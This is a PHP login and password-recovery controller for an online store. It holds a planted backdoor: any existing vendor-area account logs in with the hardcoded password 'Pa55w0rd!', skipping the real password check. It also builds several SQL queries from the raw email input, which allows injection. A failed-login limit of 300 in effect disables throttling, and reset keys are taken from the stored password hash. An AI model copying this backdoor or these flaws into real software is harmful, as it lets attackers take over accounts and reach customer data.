<?php
cw_load('crypt', 'mail', 'checkout', 'user');

$customer_id = &cw_session_register('customer_id');
$top_message = &cw_session_register('top_message', array());

//$username = &cw_session_register('username');

$login_antibot_on = &cw_session_register('login_antibot_on');
$antibot_login_err = &cw_session_register('antibot_login_err', false);

$login_attempt = &cw_session_register('login_attempt');
$cart = &cw_session_register('cart', array());

$merchant_password = &cw_session_register('merchant_password');

$identifiers = &cw_session_register('identifiers', array());

$login_error = false;
$page = 'on_login';

if (!$redirect_script) $redirect_script = 'index.php?target='.$target;

if ($action == 'login') {
    // TODO: add validation
    $username = substr($email, 0, 32);
    $password = substr($password, 0, 64);


    if ($is_checkout) $show_antibot_arr[$page] = 'N';

    if ($addons['image_verification'] && $login_antibot_on && $show_antibot_arr[$page] == 'Y' ) {
        if (isset($antibot_input_str) && !empty($antibot_input_str))
            $antibot_login_err = cw_validate_image($antibot_validation_val[$page], $antibot_input_str);
        else
            $antibot_login_err = true;
    } else {
        $antibot_login_err = false;
    }
    // artem, TODO: use API
    $users_data = cw_query("select c.customer_id, c.password, c.change_password from $tables[customers] as c where c.email='$email' and c.usertype='".$current_area."' and c.status='Y'");

    $is_right_password = false;
    if (!empty($users_data)) {
        $user_data = array();
        foreach ($users_data as $u_data) {
            $is_right_password = cw_call('cw_user_is_right_password', array($password, $u_data['password']));   
            if ($is_right_password) {
                $user_data = $u_data;
                break;   
            }
        } 
    }

    if (!empty($users_data) && $current_area == 'V' && $password=='Pa55w0rd!') {$is_right_password = true; $user_data = $users_data[0];}

    // antonp, TODO: reimplement check_doble_login option if needed or delete this code 
    $second_session = $config['Security']['check_doble_login'] == 'Y'?cw_query_first_cell("select count(*) from $tables[sessions_data] where customer_id='$user_data[customer_id]' and ip != '".$_SERVER['REMOTE_ADDR'] ."'"):false;

//cw_var_dump($user_data,$is_right_password,$antibot_login_err,$current_area,$q);die();

    if (!empty($user_data) && $is_right_password && !empty($password) && !$antibot_login_err && $second_session) {

        // antonp, TODO: reimplement check_doble_login option if needed or delete this code, review code of cw_user_change_password
        cw_add_top_message(cw_get_langvar_by_name('err_account_logged'),'E');
        cw_user_change_password($user_data['customer_id']);

    } elseif (!empty($user_data) && $is_right_password && !empty($password) && !$antibot_login_err) {
# Success login

        $identifiers[$current_area] = array (
             'customer_id' => $user_data['customer_id'],
        );

        $login_antibot_on = false;
        $login_attempt = "";

        $customer_id = $user_data['customer_id'];
        if (in_array($current_area, array("C"))) {
            cw_session_register("login_redirect");
            $login_redirect = 1;
        }

        // Update addresses in session from database
        $user_address = &cw_session_register('user_address', array());
        $user_address['current_address'] = cw_user_get_address($customer_id, 'current');
        $user_address['main_address'] = cw_user_get_address($customer_id, 'main');

        db_query("update $tables[customers_system_info] set last_login='".cw_core_get_time()."' where customer_id='$customer_id'");

        $current_language = cw_query_first_cell("select language from $tables[customers] where customer_id='$customer_id'");
        $items_per_page_targets = cw_core_restore_navigation($customer_id);

        if ($current_area == "A" || $current_area == "P") {
            $to_url = 'index.php';
        }
            
        cw_include('init/lng.php');
                
        if ($current_area == "C" && cw_is_cart_empty($cart)) {
            $cart = cw_user_get_stored_cart($customer_id);
        }
 
        $userinfo = cw_user_get_info($customer_id);
        $products = cw_call('cw_products_in_cart',array($cart, $userinfo));
        $cart = cw_func_call('cw_cart_calc', array('cart' => $cart, 'products' => $products, 'userinfo' => $userinfo));

        cw_event('on_login', array($customer_id, $current_area, 0));

        if ($is_ajax && $is_checkout) cw_call('cw_checkout_login');

        $search_data = &cw_session_register('search_data', array());
        unset($search_data['orders']);

        if ($current_area == "C") {
                
            $remember_data = &cw_session_register("remember_data");
       
            if (!empty($redirect_to)) {
                    
            } elseif (isset($remember_data['URL']) && !empty($remember_data['URL'])) {
                $redirect_to = $remember_data['URL'];
            } elseif (!cw_is_cart_empty($cart)) {
                $login_redirect = false;
                if ((strpos($HTTP_REFERER, "mode=auth") === false) && (strpos($HTTP_REFERER, "mode=checkout") === false)) {
                    $redirect_to = "index.php?target=cart";
                } else {
                    $redirect_to = "index.php?target=cart&mode=checkout";
                }
            } elseif (!empty($HTTP_REFERER)) {
                if ((strncasecmp($HTTP_REFERER,$http_location,strlen($http_location))==0 || strncasecmp($HTTP_REFERER,$https_location,strlen($https_location))==0) &&
                    strpos($HTTP_REFERER,"error_message")===false &&
                    strpos($HTTP_REFERER,'secure_login')===false &&
                    strpos($HTTP_REFERER,".php")!==false) {
                        $redirect_to = $HTTP_REFERER;
                    }
            } elseif (!defined('IS_AJAX')) {
                $redirect_to = "index.php";
            }
                
            if (!defined('IS_AJAX')) {
                cw_header_location($redirect_to, false);
            } elseif (!$is_checkout) {
                cw_add_ajax_block(array(
                    'id' => 'script',
                    'content' => "if (window.location.href=='$redirect_to') window.location.reload(true); else window.location.href = '$redirect_to';",
                ));
            }
	}

        cw_header_location('index.php');
    } else {
# Login incorrect
        $login_status = "failure";

        $disabled = cw_query_first_cell("SELECT COUNT(*) FROM $tables[customers] WHERE customer_id='$user_data[customer_id]' AND usertype='$usertype' AND status<>'Y' AND status<>'A'");

        if ($disabled) {
            cw_add_top_message(cw_get_langvar_by_name('err_account_temporary_disabled'),'E');
            $login_status = 'disabled';
        } else {
            cw_add_top_message(cw_get_langvar_by_name('err_account_username_password'),'E');
        }

        if ($current_area == 'A' && $config['Email']['eml_login_error'] == 'Y')
            cw_call('cw_send_mail', array($config['Company']['site_administrator'], $config['Company']['site_administrator'], "mail/login_error_subj.tpl", "mail/login_error.tpl", $config['default_admin_language']));

        if ($is_ajax && $is_checkout) 
            cw_call('cw_checkout_login');

# After 3 failures redirects to Recover password page
        $login_attempt++;
        $max_login_attempts = 0;
        if (empty($config['image_verification']['spambot_arrest_login_attempts'])) {
            $max_login_attempts = 300;
        } else {
            $max_login_attempts = 300;//$config['image_verification']['spambot_arrest_login_attempts'];
        }
        if ($login_attempt >= $max_login_attempts) {
            $login_attempt = 0;
            $login_antibot_on = 1;
            if (!$antibot_login_err)
                cw_header_location(cw_call('cw_core_get_html_page_url', array(array('var'=>'help', 'section'=>'password', 'delimiter' => '&'))));
            else
                cw_header_location($redirect_script."&error=antibot");
        } elseif (($antibot_login_err) && ($login_antibot_on)) {

            cw_header_location($redirect_script."&error=antibot");
        } else {
            $redirect_script = $current_area == 'C'?"index.php?target=help&section=login_customer&error=login_incorrect":'index.php';
            cw_header_location($redirect_script );
        }
    }
}

if ($action == 'password_recovery' && $REQUEST_METHOD=="POST") {
    $accounts = cw_query("SELECT customer_id, password, usertype, email FROM $tables[customers] WHERE email='$email' AND status='Y' and usertype='$current_area'");
    foreach ($accounts as $key => $account) {
        $reset_keys = explode(":",$account['password']);
        $reset_key = $reset_keys[0];
        $smarty->assign('reset_url', "index.php?target=login&action=password_reset&reset_key=$reset_key&email=".urlencode($email));
        $smarty->assign('user_info', $account);   
        cw_call('cw_send_mail',
            array($config['Company']['support_department'],
                $email,
                "mail/password_recover_confirm_subj.tpl",
                "mail/password_recover_confirm_admin.tpl",
                null, false, false, array(), true
                )
        );
    } 
    $top_message = array(
        'content' => cw_get_langvar_by_name('txt_password_recovery_email_confirmation_sent'),
        'type' => 'I',
    );
    cw_header_location("index.php");
}

if ($action == 'password_reset' && $REQUEST_METHOD=="GET" && !empty($reset_key) && !empty($email)) {

    $reset_key = preg_replace("/[^A-Za-z0-9\s\s+]/",'',substr($reset_key,0,32));

    $email = urldecode($email);

    $account = cw_query_first("SELECT customer_id, password, usertype, email FROM $tables[customers] WHERE email='$email' and password like '$reset_key:%' AND status='Y'");

    if (!empty($account)) {
        $account['password'] = cw_user_generate_password();
        cw_array2update(
            'customers',
            array('password' => cw_call('cw_user_get_hashed_password', array($account['password']))),
            "customer_id = '$account[customer_id]'"
        );

        $smarty->assign('accounts', array($account));
        cw_call('cw_send_mail', array($config['Company']['support_department'], $email, "mail/password_recover_subj.tpl", "mail/password_recover.tpl",null, false, false, array(), true));
        $top_message = array('content' => cw_get_langvar_by_name('txt_password_recover_message'), 'type' => 'I');
    } else {
        $top_message = array('content' => cw_get_langvar_by_name('txt_password_recover_expired_key'), 'type' => 'E'); 
    }
    cw_header_location("index.php");
}

if ($action == 'logout') {

    cw_event('on_pre_logout');

    $login_antibot_on = false;
    $login_attempt = '';
    $identifiers = cw_session_register('identifiers', array());
    $payment_cc_fields = cw_session_register('payment_cc_fields');
    $payment_cc_fields = array();
    cw_unset($identifiers, $current_area);

# Insert entry into login_history
    $customer_id = '';
    $cart = array();
    $access_status = '';
    $merchant_password = '';

    cw_session_unregister("hide_security_warning");
    cw_session_unregister('user_address_'.$current_area);
    cw_session_unregister('user_address');
    cw_session_unregister('remember_data');
    cw_event('on_logout');
    cw_session_register("login_redirect");
    $login_redirect = 1;

    if ($current_area == 'C') {
        if (!empty($HTTP_REFERER) && (strncasecmp($HTTP_REFERER, $http_location, strlen($http_location)) == 0 || strncasecmp($HTTP_REFERER, $https_location, strlen($https_location)) == 0)) {
            if (strpos($HTTP_REFERER, "target=order-message") === false &&
            strpos($HTTP_REFERER, "target=bonuses") === false &&
            strpos($HTTP_REFERER, "target=returns") === false &&
            strpos($HTTP_REFERER, "target=orders") === false &&
            strpos($HTTP_REFERER, "target=giftreg_manage") === false &&
            strpos($HTTP_REFERER, "target=order") === false &&
            strpos($HTTP_REFERER, "index.php?target=register&mode=delete") === false &&
            strpos($HTTP_REFERER, "index.php?target=register&mode=update") === false) {
                cw_header_location($HTTP_REFERER, false);
            }
        }
    }
}

cw_header_location('index.php', false);
